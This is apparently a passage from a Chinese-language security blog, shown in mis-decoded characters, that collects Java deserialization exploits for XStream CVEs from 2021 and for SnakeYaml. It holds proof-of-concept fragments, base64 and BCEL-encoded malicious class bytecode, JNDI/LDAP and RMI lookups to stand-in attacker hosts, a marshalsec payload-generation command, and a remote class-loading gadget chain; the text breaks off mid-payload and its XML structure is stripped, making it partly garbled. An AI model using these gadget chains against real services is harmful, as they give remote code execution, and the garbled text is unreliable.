è¿™é‡Œå…¶å®å·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¾—åœ¨classesé‡Œæ·»åŠ æˆ‘ä»¬ä¼ å…¥çš„classå­—èŠ‚ç é‡Œæ‰€ç”¨åˆ°çš„æ‰€æœ‰ç±»ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸€æ¬¡å°è¯•è½½å…¥çš„æ—¶å€™ï¼Œå°±æ‰¾åˆ°äº†ç›¸åº”çš„ç±»ï¼Œæ— éœ€å°è¯•åç»­çš„å‡ ç§è½½å…¥æ–¹å¼ã€‚ æ¯”å¦‚è¿™é‡Œæˆ‘äº§ç”Ÿçš„å­—èŠ‚ç é‡Œé¢ç”¨ä¸Šäº†Runtimeï¼Œå°±å¾—åŠ ä¸Šè¿™ä¸ªç±» è¿™é‡Œçš„Objectå¿…é¡»åŠ ä¸Šï¼Œæ¯•ç«Ÿæ‰€æœ‰çš„å¯¹è±¡éƒ½ç»§æ‰¿è‡ªObject æµ‹è¯•åå‘ç°æŠ¥é”™æç¤ºæ‰¾ä¸åˆ°çš„ç±»è¿˜æ˜¯éœ€è¦æ·»åŠ , åŸºæœ¬çš„å‘½ä»¤æ‰§è¡Œéœ€è¦ä»¥ä¸‹å››ä¸ªç±» java.lang.Object java.lang.Runtime java.lang.Throwable java.lang.Exception POC 0 false 0 java.lang.Object false false false java.lang.Object java.lang.Object java.lang.Runtime java.lang.Runtime java.lang.Throwable java.lang.Throwable java.lang.Exception java.lang.Exception $$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2P$Q$3d$X$K$z$b5$3cD$f1$fd$7e$C$LY$b8$d4$b8$d0$e0$c6$fa$88$Y$5c_$ae7x$b5$b6$a4$5c$88$7f$e4$da$8d$g$X$7e$80$le$9c$d6$H$gm$d2$99$ce$993g$ce$a4$afo$cf$_$A6$b1f$c3$c2$b8$8d$JLZ$98$8a$f2$b4$89$Z$h$v$cc$9a$9831$cf$90$deV$be$d2$3b$M$c9r$a5$c9$60$ec$F$X$92$n$ef$w_$k$f5nZ2$3c$e3$z$8f$90$a2$h$I$ee5y$a8$a2$fa$T4$f4$a5$ea2$U$dc$9eV$5e$b7V$ef$xow$af$een1X$db$c2$fb$UfD$y$b9W$bc$cfk$k$f7$db$b5$fa$ad$90$j$ad$C$9fh$d9$86$e6$e2$fa$90wbA$f2$c6$607$82$5e$u$e4$be$8a$Wd$bf$q7$a2y$H$Z$d8$s$W$i$yb$89v$90$n$b1$no$a5$83e$ac0$8c$fc$b3$c3$c1$wl$86$dco$83dy$c0$3dn$5dI$a1$Z$86$H$d0i$cf$d7$ea$86$f6$dbm$a9$bf$8bR$b9$e2$fe$e1$d0$R$GY$Q$M$eb$e5$l$dd$86$O$95$df$de$fa9p$S$GBv$bb4$90$efPS$c7$a7$9f$85$5cH$3a$c7$a4$l$V$3d$J$b0$e8H$8aCT$d5$u3$ca$a9$ea$p$d8$7d$dcv$u$a6c0$89$yE$e7$83$80$i$f2$94$z$U$be$87y$y$G$U$9f$90$u$s$l$60$9c$df$c1$3a$a8$3e$m$7d$l$e3$Z$9aM$91J$a48F_$91n$sFMR$b60LJ_$h$b20$a8$$R5B$af$89$84kb$d4$a0F$v65$f6$O$ff8$d8$efr$C$A$A false 0 0 false false 0 CVE-2021-21344 ä»PriorityQueueçš„readObjectè°ƒç”¨compareä½œä¸ºå…¥å£ç‚¹ï¼Œç›´åˆ°com.sun.xml.internal.bind.v2.runtime.reflect.Accessor.GetterSetterReflectionçš„getæ–¹æ³•è¿›è¡Œäº†åå°„è°ƒç”¨ã€‚å…³é”®ç‚¹åœ¨äºAccessor.GetterSetterReflectionç±»è™½ç„¶æœªå®ç°Serializableæ¥å£ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ååºåˆ—åŒ–ä½¿ç”¨ã€‚ä¸‹å›¾å°±æ˜¯æœ€ååˆ©ç”¨ProcessBuilder.startæ‰§è¡Œå‘½ä»¤çš„é“¾ POC1 2 java.lang.ProcessBuilder java.lang.ProcessBuilder start true 1 UTF-8 calc.exe 3 javax.xml.ws.binding.attachments.inbound javax.xml.ws.binding.attachments.inbound CVE-2021-21345 åœ¨CVE-2021-21344çš„åŸºç¡€ä¸Šä¸é‡‡ç”¨JdbcRowSetImplè€Œæ˜¯ä½¿ç”¨com.sun.corba.se.impl.activation.ServerTableEntryç±»ç›´æ¥åœ¨æœ¬åœ°æ‰§è¡Œæ¶æ„ä»£ç , åœ¨ ServerTableEntry ç±»çš„ verify æ–¹æ³•ä¸Š public int verify() { try { if (debug) System.out.println(\"Server being verified w/\" + activationCmd); process = Runtime.getRuntime().exec(activationCmd); int result = process.waitFor(); if (debug) printDebug( \"verify\", \"returns \" + ServerMain.printResult( result ) ) ; return result ; } catch (Exception e) { if (debug) printDebug( \"verify\", \"returns unknown error because of exception \" + e ) ; return ServerMain.UNKNOWN_ERROR; } } æ§åˆ¶ activationCmd çš„å€¼å³å¯å‘½ä»¤æ‰§è¡Œ 2 com.sun.corba.se.impl.activation.ServerTableEntry com.sun.corba.se.impl.activation.ServerTableEntry verify true 1 UTF-8 calc.exe 3 javax.xml.ws.binding.attachments.inbound javax.xml.ws.binding.attachments.inbound CVE-2021-21346 é€šè¿‡TreeMapçš„putæ–¹æ³•è°ƒç”¨Rdn$RdnEntryçš„compareToæ–¹æ³• å†é€šè¿‡value.equals è§¦å‘ XString çš„ equals æ–¹æ³•, that.value èµ‹å€¼ä¸º MultiUIDefaults å®ä¾‹, è§¦å‘å…¶ toString æ–¹æ³• é€šè¿‡å½“ä¸­buf.append(key + \"=\" + get(key) + \", \");è§¦å‘å…¶getæ–¹æ³•, getæ–¹æ³•ä¸­é€šè¿‡Object value = super.get(key);è°ƒç”¨UIDefaultsçš„getæ–¹æ³•, ç»è¿‡Object value = getFromHashtable( key );è°ƒç”¨å…¶getFromHashtableæ–¹æ³• è·Ÿè¿›å‘ç°å…¶valueå€¼çš„å®šä¹‰å½±å“ if (value instanceof LazyValue) { try { /* If an exception is thrown we'll just put the LazyValue * back in the table. */ value = ((LazyValue)value).createValue(this); } è®¾ç½®ä¸ºæˆ‘ä»¬éœ€è¦çš„SwingLazyValueè§¦å‘å…¶createValueæ–¹æ³•, å…¶ä¸­å…ˆæ˜¯è·å–æ–¹æ³•è€Œåå¯¹å…¶è°ƒç”¨ Object[] ç±»å‹ä¸èƒ½å¼ºåˆ¶è½¬æ¢ä¸º String ç±»å‹å¯¼è‡´æ— æ³•é€šè¿‡æ­¤é“¾è¿›è¡Œå‘½ä»¤æ‰§è¡Œ su18 0.75 525 700 0 en_US 0.75 525 700 1 lazyValue javax.naming.InitialContext doLookup ldap://127.0.0.1:1099/calc su18 test CVE-2021-21347 å‚è€ƒ: https://paper.seebug.org/1543/#3-cve-2021-21347 https://x-stream.github.io/CVE-2021-21347.html åœ¨ jdk1.8.221 å¯ä»¥å®Œç¾å¤ç°, è°ƒç”¨è‹›åˆ»å°±ä¸å†å¤šè¯´äº† CVE-2021-21350 BCELè°ƒç”¨, POCå¯å‚è€ƒ:https://x-stream.github.io/CVE-2021-21350.html CVE-2021-21351 è¿™ä¸ªæ ‡ç­¾åœ¨ä½ç‰ˆæœ¬çš„jdkä¸­æ˜¯æ²¡æœ‰çš„, éœ€è¦æ›´æ¢ä¸º, å¦‚æœæ˜¯é«˜ç‰ˆæœ¬è°ƒç”¨åˆ™æ— éœ€æ›´æ¢ ysomap -10086 false false false false false 1008 true 1000 0 2 0 0 0 true 1004 false ldap://127.0.0.1:1099/calc com.sun.rowset.JdbcRowSetImpl setAutoCommit boolean false false false -1 false false 1 1 false ysomap test CVE-2021-29505 POC 2 3 12345 com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content 12345 true SOAP_11 false aa aa UnicastRef 127.0.0.1 1099 0 0 0 0 false evil-ip 1099 JRMPListeneråœ¨1099å¼€å¯RMIæœåŠ¡å³å¯æ¶æ„åŠ è½½ç±» CVE-2021-39139 JDK7u21 RCE,å¯æ›¿æ¢ä¸º 0 -1 yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw== HelloTemplatesImpl false javax.xml.transform.Templates f5a5a608 javax.xml.transform.Templates CVE-2021-39141 JNDIæ³¨å…¥ 2 3 java.lang.Comparable false java.lang.Comparable compareTo java.lang.Object 0 PLAIN false int hash java.lang.String false hash java.lang.String javax.naming.InitialContext doLookup java.lang.String serialPersistentFields [Ljava.io.ObjectStreamField; serialPersistentFields java.lang.String CASE_INSENSITIVE_ORDER java.util.Comparator CASE_INSENSITIVE_ORDER java.lang.String serialVersionUID long serialVersionUID java.lang.String value [C value java.lang.String hash int serialPersistentFields [Ljava.io.ObjectStreamField; CASE_INSENSITIVE_ORDER java.util.Comparator serialVersionUID long value [C hash false java.lang.String java.lang.Object false false false false false ldap://127.0.0.1:1099/calc CVE-2021-39144 é€šè¿‡åŠ¨æ€ä»£ç†è§¦å‘ NullProvider çš„çˆ¶ç±» ProviderSkeleton çš„ invoke æ–¹æ³•, å†é€šè¿‡ triggerProbe æ–¹æ³•è°ƒç”¨åˆ° DTraceProbe çš„ uncheckedTrigger æ–¹æ³• protected void triggerProbe(Method var1, Object[] var2) { if (this.active) { ProbeSkeleton var3 = (ProbeSkeleton)this.probes.get(var1); if (var3 != null) { var3.uncheckedTrigger(var2); } } sun.tracing.dtrace.DTraceProbe#uncheckedTrigger public void uncheckedTrigger(Object[] var1) { try { this.implementing_method.invoke(this.proxy, var1); } catch (IllegalAccessException var3) { assert false; } catch (InvocationTargetException var4) { assert false; } } æœ€åå°±æ˜¯invokeçš„è°ƒç”¨ 2 3 java.lang.Comparable true java.lang.Comparable java.lang.Comparable compareTo java.lang.Object java.lang.Runtime exec java.lang.String calc.exe JNDIæ³¨å…¥ 2 3 java.lang.Comparable true java.lang.Comparable java.lang.Comparable compareTo java.lang.Object javax.naming.InitialContext doLookup java.lang.String ldap://127.0.0.1:1099/calc CVE-2021-39145 JNDIæ³¨å…¥, POCå‚è€ƒ: https://x-stream.github.io/CVE-2021-39145.html https://github.com/R17a-17/JavaVulnSummary/blob/bd30150e9ea4ffd44a4be47cd63aedaa93f7ba22/xstream/src/main/java/com/r17a/xstream/cve/priorityqueue/CVE_2021_39145.java CVE-2021-39146 æ€è·¯åŒCVE-2021-21346, æ‰¾åˆ°äº†SwingLazyValueçš„ä»£æ›¿å“UIDefaults$ProxyLazyValue#createValue:1105, è¿™é‡Œå­˜åœ¨ä¸€ä¸ªåå°„çš„è°ƒç”¨ if (methodName != null) { Class[] types = getClassArray(args); Method m = c.getMethod(methodName, types); return MethodUtil.invoke(m, c, args); } POC test 0.75 525 700 0 zh_CN 0.75 525 700 1 lazyValue javax.naming.InitialContext doLookup ldap://127.0.0.1:1099/calc test test CVE-2021-39147/CVE-2021-39148 å‚è€ƒ: https://www.anquanke.com/post/id/234537 https://www.anquanke.com/post/id/251814 ç‰¹å®šJDKç‰ˆæœ¬ä¸‹è½½å¤–éƒ¨çš„ä»»æ„ä»£ç  CVE-2021-39149 å‚è€ƒ: https://xz.aliyun.com/t/10360 é€šè¿‡åŠ¨æ€ä»£ç†åœ¨HashMapè°ƒç”¨hashçš„æ–¹æ³•ä¸­ä½¿ç”¨åŠ¨æ€ä»£ç†è°ƒç”¨hashCode static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16); } åŠ¨æ€ä»£ç†æŒ‡å‘ com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl#invoke public Object invoke( Object proxy, Method method, Object[] args ) throws Throwable { // Note that the declaring class in method is the interface // in which the method was defined, not the proxy class. Class cls = method.getDeclaringClass() ; InvocationHandler handler = (InvocationHandler)classToInvocationHandler.get( cls ) ; if (handler == null) { if (defaultHandler != null) handler = defaultHandler ; else { ORBUtilSystemException wrapper = ORBUtilSystemException.get( CORBALogDomains.UTIL ) ; throw wrapper.noInvocationHandler( \"\\\"\" + method.toString() + \"\\\"\" ) ; } } // handler should never be null here. return handler.invoke( proxy, method, args ) ; } ç»§ç»­æ§åˆ¶handlerèµ‹å€¼ä¸ºNullProviderç„¶åè°ƒç”¨ProviderSkeletonä¸­çš„invokeæ–¹æ³•, è¿›è€Œè·Ÿè¿›è‡³triggerProbe, æ­¤æ—¶ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºnull, åç»­å°±æ˜¯ DTraceProbe çš„ uncheckedTrigger æ–¹æ³•çš„ invoke è°ƒç”¨ map true java.lang.Object java.lang.Object hashCode Evil yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw== -1 0 false com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getOutputProperties CVE-2021-39153 PriorityQueue.siftDownUsingComparator PackageWriter$2.compare BeanAdapter.get com.sun.javafx.fxml.BeanAdapter#getè§¦å‘MethodUtil.invoke private Object get(String key) { Method getterMethod = key.endsWith(PROPERTY_SUFFIX) ? localCache.getMethod(key) : getGetterMethod(key); Object value; if (getterMethod != null) { try { value = MethodUtil.invoke(getterMethod, bean, (Object[]) null); } catch (IllegalAccessException exception) { throw new RuntimeException(exception); } catch (InvocationTargetException exception) { throw new RuntimeException(exception); } } else { value = null; } return value; } POC 2 0 0 false false false false false 0 0 0 0 0 0 0 Pwnr yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw== -1 0 false getOutputProperties com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getOutputProperties 0 3 ricky outputProperties ricky CVE Reference å…¨éƒ¨CVEè¯·å‚è€ƒ: https://x-stream.github.io/security.html æˆ–è€…ä½¿ç”¨marshalsecå·¥å…·ç”Ÿæˆpayload java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils rmi://127.0.0.1:2333/exp SankeYaml å¤§å¤šæ•° java é¡¹ç›®ç”¨æ¥å¤„ç†æ•°æ®åŸºæœ¬ä¸Šéƒ½æ˜¯ xml å’Œ json ä¸¤ç§æ ¼å¼ï¼Œyaml ç›¸å¯¹æ¥è¯´å°‘è§ä¸€ç‚¹ï¼Œåœ¨æˆ‘åšè¿‡çš„ä¸€äº›ä»£ç å®¡è®¡é¡¹ç›®é‡Œï¼Œä½¿ç”¨ yaml å¤„ç†åº“æœ€å¸¸è§çš„å°±æ˜¯ SnakeYamlï¼Œè™½ç„¶è¿˜æœ‰ jyamlã€YAMLBeans ä¹‹ç±»çš„åº“ï¼Œä½†æˆ‘åœ¨çœŸå®ç¯å¢ƒé‡ŒæŒºå°‘æœ‰è§åˆ°ä½¿ç”¨çš„ã€‚ å…ˆå¯¼å…¥ snakeyaml ä¾èµ– org.yaml snakeyaml 1.17 ç„¶åè¾“å‡ºåºåˆ—åŒ–ä¸€ä¸ª javabean import org.yaml.snakeyaml.Yaml; public class snakeyaml { public static void main(String[] args) { Yaml yaml = new Yaml(); Person person = new Person(\"ricky\", 18); String dump = yaml.dump(person); System.out.println(dump); } } è¾“å‡ºç»“æœ !!Person {age: 18, name: ricky} !! åé¢è·Ÿå…¨ç±»åï¼Œ{} é‡Œæ˜¯å±æ€§åå’Œå±æ€§å€¼ï¼Œä¸­é—´ä½¿ç”¨é€—å·åˆ†éš”ï¼Œsankeyaml ç‰¹ç‚¹åœ¨äºå®ƒæ²¡æœ‰é»‘åå•ï¼Œä¸èƒ½è®¾ç½®ç§æœ‰å±æ€§ï¼Œä¸èƒ½ä½¿ç”¨æ„é€ æ–¹æ³•è§¦å‘çš„ gadgets æ‰€ä»¥é‡‡ç”¨ç›´æ¥å¯¹ç±»çš„è§¦å‘ !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://127.0.0.1:1099/calc', autoCommit: true} YAMLåŸºæœ¬æ ¼å¼è¦æ±‚ï¼š YAMLå¤§å°å†™æ•æ„Ÿï¼› ä½¿ç”¨ç¼©è¿›ä»£è¡¨å±‚çº§å…³ç³»ï¼› ç¼©è¿›åªèƒ½ä½¿ç”¨ç©ºæ ¼ï¼Œä¸èƒ½ä½¿ç”¨TABï¼Œä¸è¦æ±‚ç©ºæ ¼ä¸ªæ•°ï¼Œåªéœ€è¦ç›¸åŒå±‚çº§å·¦å¯¹é½ï¼ˆä¸€èˆ¬2ä¸ªæˆ–4ä¸ªç©ºæ ¼ï¼‰ æ„é€ payloadæ—¶éœ€è¦æŒ‰ç…§è¿™ä¸ªæ ¼å¼è¦æ±‚è¿›è¡Œæ„é€ , å¦åˆ™ä¼šæŠ¥é”™ import org.yaml.snakeyaml.Yaml; public class snakeyaml { public static void main(String[] args) { Yaml yaml = new Yaml(); yaml.load(\"!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://127.0.0.1:1099/calc',autoCommit: true}\"); } } ScriptEngineManager åŸºäºjavax.script.ScriptEngineManagerçš„åˆ©ç”¨é“¾, æœ¬æ¬¡åˆ©ç”¨æ˜¯åŸºäºjavax.script.ScriptEngineManagerçš„åˆ©ç”¨é“¾ TestEvil.javaï¼Œéœ€è¦å®ç°ScriptEngineManageræ¥å£ç±»ï¼Œå…¶ä¸­çš„é™æ€ä»£ç å—ç”¨äºæ‰§è¡Œæ¶æ„ä»£ç ï¼Œå°†å…¶ç¼–è¯‘æˆTestEvil.classç„¶åæ”¾ç½®äºç¬¬ä¸‰æ–¹WebæœåŠ¡ä¸­ï¼š import javax.script.ScriptEngine; import javax.script.ScriptEngineFactory; import java.util.List; public class TestEvil implements ScriptEngineFactory { public TestEvil() throws Exception{ Runtime.getRuntime().exec(\"calc.exe\"); } @Override public String getEngineName() { return null; } @Override public String getEngineVersion() { return null; } @Override public List getExtensions() { return null; } @Override public List getMimeTypes() { return null; } @Override public List getNames() { return null; } @Override public String getLanguageName() { return null; } @Override public String getLanguageVersion() { return null; } @Override public Object getParameter(String key) { return null; } @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; } @Override public String getOutputStatement(String toDisplay) { return null; } @Override public String getProgram(String... statements) { return null; } @Override public ScriptEngine getScriptEngine() { return null; } } å¦å¤–ï¼Œåœ¨å·²æ”¾ç½®PoC.classçš„ç¬¬ä¸‰æ–¹WebæœåŠ¡ä¸­ï¼Œåœ¨å½“å‰ç›®å½•æ–°å»ºå¦‚ä¸‹æ–‡ä»¶META-INF\\services\\javax.script.ScriptEngineFactoryï¼Œå…¶ä¸­å†…å®¹ä¸ºæŒ‡å®šè¢«æ‰§è¡Œçš„ç±»åTestEvil, ç„¶åè°ƒç”¨POCå³å¯å¼¹å‡ºè®¡ç®—æœº import org.yaml.snakeyaml.Yaml; public class snakeyaml { public static void main(String[] args) { Yaml yaml = new Yaml(); yaml.load(\"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL 